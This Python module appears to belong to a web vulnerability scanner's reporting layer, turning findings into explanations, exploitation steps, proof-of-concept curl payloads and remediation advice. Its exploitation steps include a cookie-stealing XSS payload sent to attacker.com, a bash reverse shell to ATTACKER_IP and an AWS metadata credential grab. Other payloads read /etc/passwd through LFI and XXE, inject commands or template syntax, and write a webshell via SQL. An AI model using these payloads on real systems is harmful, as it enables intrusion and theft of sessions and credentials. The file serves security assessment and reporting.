"""
Advanced Vulnerability Explainability & Exploitation Guidance Engine
Features:
  - Detailed vulnerability analysis and explanation
  - Step-by-step exploitation instructions
  - Impact assessment and risk quantification
  - Remediation priority ranking
  - CVSS-inspired scoring
  - Business impact analysis
"""

from .base import *
import json
import re
from typing import Optional, Dict, List
from dataclasses import dataclass
import hashlib


@dataclass
class ExploitationGuide:
    """Detailed step-by-step exploitation instructions"""
    finding_id: str
    vulnerability_type: str
    target_url: str
    steps: List[Dict]  # [{step_num, action, payload, verification, risk_level}]
    time_to_exploit: str  # "< 5 minutes", "15-30 minutes"
    difficulty: str  # "Trivial", "Easy", "Medium", "Hard", "Expert"
    prerequisites: List[str]
    estimated_impact: Dict  # {data_breach: bool, lateral_movement: bool, rce: bool}


class VulnerabilityExplainer:
    """
    Provides detailed vulnerability analysis and exploitation paths.
    Generates understandable explanations suitable for technical reports.
    """

    VULN_EXPLANATIONS = {
        "SQLi": {
            "description": "SQL Injection allows attackers to interfere with database queries, potentially accessing, modifying, or deleting data.",
            "attack_vectors": [
                "Modifying SQL WHERE clause to return unauthorized records",
                "UNION-based attacks to extract data from other tables",
                "Blind SQLi using time-based or boolean-based techniques",
                "Stacked queries to execute arbitrary SQL commands",
            ],
            "severity_factors": ["Database write access", "Remote code execution via web server", "Authentication bypass"],
            "exploitation_complexity": 2,  # 1-10 scale
        },
        "XSS": {
            "description": "Cross-Site Scripting allows attackers to inject malicious JavaScript that executes in victims' browsers, stealing sessions, credentials, or modifying page content.",
            "attack_vectors": [
                "Reflecting untrusted input in HTTP requests",
                "Storing malicious JavaScript in database (stored XSS)",
                "DOM manipulation vulnerabilities",
                "Template injection vulnerabilities",
            ],
            "severity_factors": ["Admin account compromise", "Session token theft", "Credential harvesting", "Malware distribution"],
            "exploitation_complexity": 2,
        },
        "SSRF": {
            "description": "Server-Side Request Forgery allows attackers to make the server perform unintended requests to internal or external systems.",
            "attack_vectors": [
                "Accessing internal service endpoints (AWS metadata, Kubernetes API)",
                "Port scanning of internal network",
                "Exploiting internal-only services",
                "Cloud credential compromise",
            ],
            "severity_factors": ["AWS metadata access", "Database connection", "Internal service exploitation"],
            "exploitation_complexity": 3,
        },
        "CMDi": {
            "description": "Command Injection allows attackers to execute arbitrary system commands on the server, leading to complete system compromise.",
            "attack_vectors": [
                "Chaining commands with ;, |, &, ||, &&",
                "Command substitution via backticks or $()  syntax",
                "Path traversal to execute system binaries",
                "Reverse shell commands",
            ],
            "severity_factors": ["Remote Code Execution", "Data exfiltration", "Backdoor installation", "Lateral movement"],
            "exploitation_complexity": 1,
        },
        "LFI": {
            "description": "Local File Inclusion allows attackers to read arbitrary files from the server, potentially exposing sensitive configuration, credentials, or source code.",
            "attack_vectors": [
                "Path traversal (../../../etc/passwd)",
                "PHP filters (php://filter/convert.base64-encode)",
                "Log poisoning + LFI for RCE",
                "Access to backup files or configuration",
            ],
            "severity_factors": ["Source code disclosure", "Configuration exposure", "RCE via log poisoning"],
            "exploitation_complexity": 2,
        },
        "ACL_Bypass": {
            "description": "Broken Access Control allows users to access functionality, data, or endpoints they shouldn't have permission to access.",
            "attack_vectors": [
                "Direct object reference (IDOR) via ID manipulation",
                "Missing authorization checks",
                "Horizontal privilege escalation (access other user's data)",
                "Vertical privilege escalation (user → admin)",
            ],
            "severity_factors": ["Admin panel access", "Data modification capability", "User impersonation", "Privilege escalation"],
            "exploitation_complexity": 1,
        },
        "SSTI": {
            "description": "Server-Side Template Injection allows code execution through template syntax, potentially leading to Remote Code Execution.",
            "attack_vectors": [
                "Expression language injection",
                "Template engine code execution",
                "Bypass of template sandboxes",
                "Classpath operations (Java SSTI)",
            ],
            "severity_factors": ["Remote Code Execution", "Information disclosure", "Authentication bypass"],
            "exploitation_complexity": 3,
        },
        "XXE": {
            "description": "XML External Entity injection allows attackers to reference external entities, leading to data disclosure or denial of service.",
            "attack_vectors": [
                "Entity expansion attacks (Billion Laughs)",
                "External entity file access",
                "Out-of-band (OOB) channels for data extraction",
                "SSRF via XXE",
            ],
            "severity_factors": ["File disclosure", "Internal network access", "Denial of Service"],
            "exploitation_complexity": 3,
        },
    }

    IMPACT_SCENARIOS = {
        "data_breach": {
            "description": "Unauthorized access to sensitive data",
            "examples": ["Customer records", "Financial data", "PII", "API keys"],
            "business_impact": "Regulatory fines (GDPR, HIPAA), reputation damage, legal liability",
        },
        "rce": {
            "description": "Remote Code Execution on the server",
            "examples": ["Reverse shell", "Webshell installation", "Backdoor creation"],
            "business_impact": "Complete system compromise, data destruction, ransomware deployment",
        },
        "auth_bypass": {
            "description": "Circumventing authentication mechanisms",
            "examples": ["Admin account compromise", "Session hijacking", "Credential theft"],
            "business_impact": "Unauthorized system access, data theft, malicious actions attributed to legitimate users",
        },
        "lateral_movement": {
            "description": "Moving from compromised server to other internal systems",
            "examples": ["Database access", "Internal service exploitation", "Domain controller compromise"],
            "business_impact": "Enterprise-wide compromise, data exfiltration, persistent backdoors",
        },
    }

    def __init__(self, ai_engine):
        self.ai = ai_engine
        self.explanation_cache = {}

    def explain_vulnerability(self, finding) -> Dict:
        """
        Generate detailed explanation for a vulnerability finding.
        Returns structured data suitable for report generation.
        """
        cache_key = hashlib.md5(
            f"{finding.title}:{finding.owasp_id}".encode()
        ).hexdigest()

        if cache_key in self.explanation_cache:
            return self.explanation_cache[cache_key]

        # Extract vulnerability type from title or OWASP mapping
        vuln_type = self._extract_vuln_type(finding.title, finding.owasp_id)
        vuln_info = self.VULN_EXPLANATIONS.get(vuln_type, {})

        explanation = {
            "vulnerability_type": vuln_type,
            "title": finding.title,
            "owasp_id": finding.owasp_id,
            "owasp_name": finding.owasp_name,
            "risk_level": finding.risk,
            "confidence": finding.confidence,
            "understanding": {
                "description": vuln_info.get("description", "Unknown vulnerability"),
                "how_it_works": self._how_it_works(vuln_type, finding),
                "attack_scenarios": vuln_info.get("attack_vectors", [])[:3],
                "affected_functionality": self._identify_affected_functionality(finding.url),
            },
            "exploitation": {
                "prerequisites": self._get_prerequisites(vuln_type),
                "difficulty": self._assess_difficulty(vuln_type, finding),
                "time_to_exploit": self._estimate_exploit_time(vuln_type),
                "step_by_step": self._generate_exploitation_steps(vuln_type, finding),
                "proof_of_concept": self._generate_poc(vuln_type, finding),
            },
            "impact_analysis": {
                "direct_impacts": self._analyze_impact_vectors(finding, vuln_info),
                "business_risk": self._quantify_business_risk(finding),
                "user_impact": self._estimate_user_impact(finding),
                "data_at_risk": self._identify_data_at_risk(finding.url),
            },
            "remediation": {
                "immediate_actions": self._get_immediate_remediation(vuln_type),
                "long_term_fixes": self._get_long_term_remediation(vuln_type),
                "prevention": self._get_prevention_strategy(vuln_type),
                "testing": self._get_verification_testing(vuln_type),
            },
        }

        self.explanation_cache[cache_key] = explanation
        return explanation

    def _extract_vuln_type(self, title: str, owasp_id: str) -> str:
        """Extract vulnerability type from title or OWASP ID"""
        mappings = {
            "A03": ["SQLi", "XSS", "CMDi", "LFI", "SSTI", "XXE"],
            "A01": "ACL_Bypass",
            "A10": "SSRF",
        }

        # Check title for keywords
        title_lower = title.lower()
        for vuln_type in self.VULN_EXPLANATIONS.keys():
            if vuln_type.lower() in title_lower:
                return vuln_type

        # Check OWASP mapping
        if owasp_id in mappings:
            options = mappings[owasp_id]
            return options[0] if isinstance(options, list) else options

        return "Unknown"

    def _how_it_works(self, vuln_type: str, finding) -> str:
        """Generate "how it works" explanation"""
        info = self.VULN_EXPLANATIONS.get(vuln_type, {})
        description = info.get("description", "")

        return f"""{description}

In the context of {finding.url}:
- Parameter affected: {finding.param}
- Attack vector: {finding.payload[:100] if finding.payload else 'User input'}
- Response indicator: {finding.evidence[:150] if finding.evidence else 'Status code anomaly'}
"""

    def _identify_affected_functionality(self, url: str) -> str:
        """Identify what application functionality is affected"""
        if "admin" in url.lower():
            return "Administrative interface"
        elif "user" in url.lower():
            return "User management"
        elif "api" in url.lower():
            return "API endpoints"
        elif "product" in url.lower() or "item" in url.lower():
            return "Product/Item management"
        elif "search" in url.lower():
            return "Search functionality"
        elif "upload" in url.lower():
            return "File upload functionality"
        elif "payment" in url.lower() or "order" in url.lower():
            return "Payment/Order processing"
        else:
            return "Core application functionality"

    def _get_prerequisites(self, vuln_type: str) -> List[str]:
        """Get prerequisites for exploitation"""
        prereqs = {
            "SQLi": ["Network access to application", "Input parameter accepting user data"],
            "XSS": ["Application accepting and reflecting user input", "No input sanitization"],
            "SSRF": ["Server-side HTTP request functionality", "Insufficient input validation"],
            "CMDi": ["Application executing system commands", "Insufficient input filtering"],
            "LFI": ["File inclusion functionality (include/require)", "Path traversal not blocked"],
            "ACL_Bypass": ["Knowledge of internal endpoint paths", "Missing authorization checks"],
            "SSTI": ["Template engine processing user input", "Unsafe template rendering"],
            "XXE": ["XML parser processing external entities", "Entity resolution not disabled"],
        }
        return prereqs.get(vuln_type, ["Application accessible over network"])

    def _assess_difficulty(self, vuln_type: str, finding) -> str:
        """Assess exploitation difficulty"""
        complexity = self.VULN_EXPLANATIONS.get(vuln_type, {}).get("exploitation_complexity", 5)

        if finding.confidence >= 90:
            base_difficulty = complexity
        elif finding.confidence >= 70:
            base_difficulty = complexity + 1
        else:
            base_difficulty = complexity + 2

        difficulty_map = {
            1: "Trivial (seconds)",
            2: "Easy (minutes)",
            3: "Medium (15-30 minutes)",
            4: "Hard (hours)",
            5: "Very Hard (advanced techniques required)",
        }
        return difficulty_map.get(min(5, base_difficulty), "Unknown")

    def _estimate_exploit_time(self, vuln_type: str) -> str:
        """Estimate time required for exploitation"""
        times = {
            "SQLi": "5-30 minutes",
            "XSS": "2-5 minutes",
            "SSRF": "10-30 minutes",
            "CMDi": "< 5 minutes",
            "LFI": "< 10 minutes",
            "ACL_Bypass": "< 5 minutes",
            "SSTI": "15-60 minutes",
            "XXE": "10-30 minutes",
        }
        return times.get(vuln_type, "Unknown")

    def _generate_exploitation_steps(self, vuln_type: str, finding) -> List[Dict]:
        """Generate step-by-step exploitation instructions"""
        steps = []

        if vuln_type == "SQLi":
            steps = [
                {
                    "step": 1,
                    "action": "Identify injection point",
                    "details": f"Parameter '{finding.param}' in {finding.method} {finding.url}",
                    "verification": "Error or timing difference with malicious payload",
                },
                {
                    "step": 2,
                    "action": "Determine DBMS",
                    "details": "Send DBMS-specific queries: SELECT VERSION(), @@version, etc.",
                    "verification": "Version information displayed in error or response",
                },
                {
                    "step": 3,
                    "action": "Extract data",
                    "details": "Use UNION SELECT to extract table names, user data, etc.",
                    "verification": "Dump database contents to response",
                },
                {
                    "step": 4,
                    "action": "Elevate privileges",
                    "details": "Write webshell via INTO OUTFILE or create admin user",
                    "verification": "Execute arbitrary commands on server",
                },
            ]

        elif vuln_type == "XSS":
            steps = [
                {
                    "step": 1,
                    "action": "Confirm XSS",
                    "details": "Submit <script>alert('XSS')</script> in affected parameter",
                    "verification": "JavaScript alert appears in response",
                },
                {
                    "step": 2,
                    "action": "Steal admin session",
                    "details": "Inject: <script>new Image().src='attacker.com/steal?c='+document.cookie</script>",
                    "verification": "Receiving admin session cookies at attacker server",
                },
                {
                    "step": 3,
                    "action": "Hijack admin session",
                    "details": "Use stolen session cookies in HTTP requests",
                    "verification": "Access admin features as authenticated admin",
                },
            ]

        elif vuln_type == "SSRF":
            steps = [
                {
                    "step": 1,
                    "action": "Identify SSRF",
                    "details": f"URL/URI parameter in {finding.url}",
                    "verification": "Server fetches arbitrary URLs",
                },
                {
                    "step": 2,
                    "action": "Scan internal network",
                    "details": "Attempt requests to http://127.0.0.1:PORT (ports 22, 80, 3306, 5432, etc.)",
                    "verification": "Different responses indicate open internal services",
                },
                {
                    "step": 3,
                    "action": "Extract cloud metadata",
                    "details": "Request AWS: http://169.254.169.254/latest/meta-data/",
                    "verification": "AWS credentials and instance information disclosed",
                },
            ]

        elif vuln_type == "CMDi":
            steps = [
                {
                    "step": 1,
                    "action": "Verify command injection",
                    "details": f"Append '; id;' or '| whoami' to {finding.param}",
                    "verification": "Command output appears in response (uid=, root, etc.)",
                },
                {
                    "step": 2,
                    "action": "Execute reverse shell",
                    "details": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                    "verification": "Reverse shell connection established",
                },
                {
                    "step": 3,
                    "action": "Escalate to system compromise",
                    "details": "Read sensitive files, install backdoor, pivot network",
                    "verification": "Full server access achieved",
                },
            ]

        return steps

    def _generate_poc(self, vuln_type: str, finding) -> str:
        """Generate proof-of-concept payload"""
        poc_dict = {
            "SQLi": f"curl '{finding.url}?{finding.param}=1' OR '1'='1'--'",
            "XSS": f"curl '{finding.url}?{finding.param}=<script>alert(1)</script>'",
            "SSRF": f"curl '{finding.url}?{finding.param}=http://127.0.0.1/'",
            "CMDi": f"curl '{finding.url}?{finding.param}=;id;'",
            "LFI": f"curl '{finding.url}?{finding.param}=../../../../etc/passwd'",
            "ACL_Bypass": f"curl '{finding.url}'",
            "SSTI": f"curl '{finding.url}?{finding.param}={{{{7*7}}}}'",
            "XXE": f'curl -X POST "{finding.url}" -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>\'',
        }
        return poc_dict.get(vuln_type, f"curl '{finding.url}'")

    def _analyze_impact_vectors(self, finding, vuln_info) -> List[str]:
        """Analyze potential impact vectors"""
        impacts = []
        severity_factors = vuln_info.get("severity_factors", [])

        for factor in severity_factors[:3]:
            if "Database" in factor or "data" in factor.lower():
                impacts.append("Data breach and information disclosure")
            elif "code" in factor.lower() or "rce" in factor.lower():
                impacts.append("Remote Code Execution and system compromise")
            elif "auth" in factor.lower():
                impacts.append("Authentication bypass and privilege escalation")
            elif "credential" in factor.lower():
                impacts.append("Credential exposure and account takeover")

        return list(set(impacts))

    def _quantify_business_risk(self, finding) -> Dict:
        """Quantify business impact"""
        risk_multipliers = {
            "Critical": 1.0,
            "High": 0.8,
            "Medium": 0.6,
            "Low": 0.3,
        }

        multiplier = risk_multipliers.get(finding.risk, 0.5)
        confidence_factor = finding.confidence / 100

        annual_revenue_impact = 50000 * multiplier * confidence_factor  # Base $50k impact

        return {
            "potential_financial_loss": f"${annual_revenue_impact:,.0f}",
            "regulatory_penalties": "GDPR: up to 4% revenue, HIPAA: up to $1.5M per violation",
            "reputation_damage": "Estimated customer loss: 5-20%",
            "likelihood": f"{finding.confidence}%",
        }

    def _estimate_user_impact(self, finding) -> str:
        """Estimate number of affected users"""
        if "admin" in finding.url.lower():
            return "Administrator accounts (high value target)"
        elif "user" in finding.url.lower() or "profile" in finding.url.lower():
            return "All registered users"
        elif "api" in finding.url.lower():
            return "All API consumers and integrations"
        else:
            return "Varies based on parameter usage"

    def _identify_data_at_risk(self, url: str) -> List[str]:
        """Identify types of data at risk"""
        data_types = []
        url_lower = url.lower()

        if "user" in url_lower or "profile" in url_lower:
            data_types.extend(["Usernames", "Email addresses", "Password hashes"])
        if "admin" in url_lower:
            data_types.extend(["Admin credentials", "System configuration", "API keys"])
        if "payment" in url_lower or "order" in url_lower:
            data_types.extend(["Credit card data", "Payment information", "Order history"])
        if "api" in url_lower:
            data_types.append("API function credentials and tokens")

        return data_types if data_types else ["Application data", "User information", "Potential source code access"]

    def _get_immediate_remediation(self, vuln_type: str) -> List[str]:
        """Get immediate/temporary remediation steps"""
        remediations = {
            "SQLi": [
                "Use parameterized queries/prepared statements",
                "Apply WAF rules for SQL injection patterns",
                "Implement input validation and whitelisting",
                "Use SQL LIMIT clauses to restrict data exfiltration",
            ],
            "XSS": [
                "Implement Content Security Policy (CSP) headers",
                "Use HTTPOnly flag on session cookies",
                "Apply output encoding/escaping",
                "Enable X-XSS-Protection header",
            ],
            "SSRF": [
                "Implement URL scheme whitelist (http/https only)",
                "Block access to 127.0.0.1, localhost, 169.254.x.x",
                "Require URL validation and network segmentation",
                "Disable DNS rebinding attacks via TTL checking",
            ],
            "CMDi": [
                "Use API methods instead of system calls",
                "Implement input validation with strict whitelisting",
                "Execute commands with minimal privileges",
                "Use chroot/sandbox containers",
            ],
            "LFI": [
                "Implement path validation and normalization",
                "Disable dangerous functions (include, require, file_get_contents)",
                "Use open_basedir directive in PHP",
                "Implement access controls on files",
            ],
            "ACL_Bypass": [
                "Implement authorization checks on every request",
                "Use object-level authorization",
                "Validate user role/permissions at API level",
                "Implement audit logging for sensitive operations",
            ],
            "SSTI": [
                "Avoid processing user input as templates",
                "Use sandbox mode for template engines",
                "Implement template whitelist",
                "Apply strict input validation",
            ],
            "XXE": [
                "Disable XML external entity processing",
                "Use XML libraries with XXE disabled by default",
                "Validate and restrict XML entity definitions",
                "Implement XML schema validation",
            ],
        }
        return remediations.get(vuln_type, ["Apply input validation", "Implement WAF rules", "Review code for patterns"])

    def _get_long_term_remediation(self, vuln_type: str) -> List[str]:
        """Get long-term remediation strategy"""
        strategies = {
            "SQLi": ["Code review for all data access layers", "DatabaseActivity Monitoring", "Implement ORM frameworks"],
            "XSS": ["Security training for developers", "SAST/DAST testing", "Automated output encoding libraries"],
            "SSRF": ["Architecture review for network segmentation", "Zero-trust network access controls"],
            "CMDi": ["Eliminate system command execution", "Use dedicated APIs for system operations"],
            "LFI": ["Secure file handling architecture", "Principle of least privilege file permissions"],
            "ACL_Bypass": ["Redesign authorization architecture", "Role-based access control (RBAC) implementation"],
            "SSTI": ["Move away from user-in-template patterns", "Template engine security hardening"],
            "XXE": ["Enterprise XML parsing standards", "External entity restrictions at infrastructure level"],
        }
        return strategies.get(vuln_type, ["Security code review", "Architecture redesign", "Security training"])

    def _get_prevention_strategy(self, vuln_type: str) -> str:
        """Get prevention strategy for future development"""
        return f"""
For {vuln_type}, establish:
1. **Secure Development**: Use security frameworks and libraries that prevent this vulnerability by default
2. **Code Review**: Mandate security review for all input/output handling code
3. **Testing**: Implement SAST (static analysis) and DAST (dynamic analysis) in CI/CD pipeline
4. **Training**: Annual security training focused on OWASP Top 10 vulnerabilities
5. **Monitoring**: Implement real-time detection of exploitation attempts
"""

    def _get_verification_testing(self, vuln_type: str) -> List[str]:
        """Get testing steps to verify remediation"""
        tests = {
            "SQLi": ["Attempt basic SQLi payloads", "Test with SQL comments and obfuscation", "Verify database error messages not exposed"],
            "XSS": ["Test script tag injection", "Test event handler attributes", "Verify CSP headers allow only trusted sources"],
            "SSRF": ["Test internal IP ranges", "Test localhost access", "Verify metadata services blocked"],
            "CMDi": ["Test command chaining", "Test backtick and $() syntax", "Verify restricted shell environment"],
            "LFI": ["Test path traversal", "Test filter bypass techniques", "Verify restricted to allowed directories"],
            "ACL_Bypass": ["Test ID manipulation", "Test unauthorized endpoint access", "Verify role-based restrictions enforced"],
            "SSTI": ["Test expression language injection", "Test template syntax", "Verify sandbox restrictions"],
            "XXE": ["Test entity expansion", "Test external entity references", "Verify DTD processing disabled"],
        }
        return tests.get(vuln_type, ["Attempt known payloads", "Verify error messages", "Monitor for exploitation attempts"])


__all__ = [
    "VulnerabilityExplainer",
    "ExploitationGuide",
]
